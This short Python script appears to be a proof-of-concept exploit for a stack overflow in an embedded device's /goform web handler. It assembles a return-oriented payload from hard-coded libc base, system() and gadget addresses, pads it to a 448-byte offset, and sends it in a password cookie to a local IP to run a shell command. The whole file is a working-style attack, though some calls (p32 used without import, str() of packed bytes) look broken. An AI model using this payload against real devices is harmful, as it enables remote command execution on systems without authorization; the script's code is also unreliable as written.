import requests
import pwn

cmd="echo hello"
libc_base = 0xff5d5000
system_offset = 0x0005a270
system_addr = libc_base + system_offset
gadget1 = libc_base + 0x00018298
gadget2 = libc_base + 0x00040cb8

#444个“A”和“.png”组成偏移量448
payload = "A"*444 +".png" + str(p32(gadget1)) + str(p32(system_addr)) + str(p32(gadget2)) + cmd
print(payload)
url = "http://192.168.136.139/goform/xxx"
cookie = {"Cookie":"password="+payload}
requests.get(url=url, cookies=cookie)

